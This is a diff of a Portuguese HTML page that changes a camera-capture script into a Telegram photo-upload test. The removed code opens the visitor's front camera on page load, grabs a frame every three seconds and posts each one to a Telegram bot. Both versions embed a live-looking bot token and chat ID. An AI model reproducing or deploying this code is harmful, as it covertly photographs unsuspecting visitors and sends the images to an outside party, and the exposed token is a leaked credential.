@@ -1,43 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Acessar Câmera e Tirar Fotos</title>
+    <title>Teste de Envio de Foto</title>
 </head>
 <body>
-    <h1>Acessando a câmera...</h1>
-    <video id="camera-stream" width="640" height="480" autoplay></video>
-    <canvas id="camera-canvas" width="640" height="480" style="display: none;"></canvas>
+    <h1>Teste de Envio de Foto</h1>
+    <button id="send-test-photo">Enviar Foto de Teste</button>
 
     <script>
-        const video = document.getElementById('camera-stream');
-        const canvas = document.getElementById('camera-canvas');
-        const context = canvas.getContext('2d');
         const botToken = '7039889991:AAEcoAkuppMt6JvzpJUhSkcXUOUQu1pKnrk';
         const chatId = '5156117895';
         const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-        async function startCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                video.srcObject = stream;
-                capturePhotos();
-            } catch (error) {
-                console.error('Erro ao acessar a câmera:', error);
-            }
-        }
-
-        function capturePhotos() {
-            setInterval(() => {
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob((blob) => {
-                    console.log('Foto capturada:', blob); // Log para verificar o Blob
+        document.getElementById('send-test-photo').addEventListener('click', () => {
+            fetch('https://via.placeholder.com/150')
+                .then(res => res.blob())
+                .then(blob => {
+                    console.log('Blob da imagem de teste:', blob);
                     sendPhotoToTelegram(blob);
-                }, 'image/png');
-            }, 3000); // Captura uma foto a cada 3 segundos
-        }
+                });
+        });
 
         function sendPhotoToTelegram(blob) {
-            console.log('Enviando foto para o Telegram'); // Log para verificar se a função foi chamada
+            console.log('Enviando foto de teste para o Telegram'); // Log para verificar se a função foi chamada
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
@@ -52,17 +37,14 @@
               .then(data => {
                   console.log('Resposta do Telegram:', data); // Log para verificar a resposta do Telegram
                   if (data.ok) {
-                      console.log('Foto enviada com sucesso!');
+                      console.log('Foto de teste enviada com sucesso!');
                   } else {
-                      console.error('Erro ao enviar foto:', data);
+                      console.error('Erro ao enviar foto de teste:', data);
                   }
               }).catch(error => {
-                  console.error('Erro ao enviar foto:', error);
+                  console.error('Erro ao enviar foto de teste:', error);
               });
         }
-
-        // Inicia a câmera automaticamente quando a página é carregada
-        window.onload = startCamera;
     </script>
 </body>
 </html>
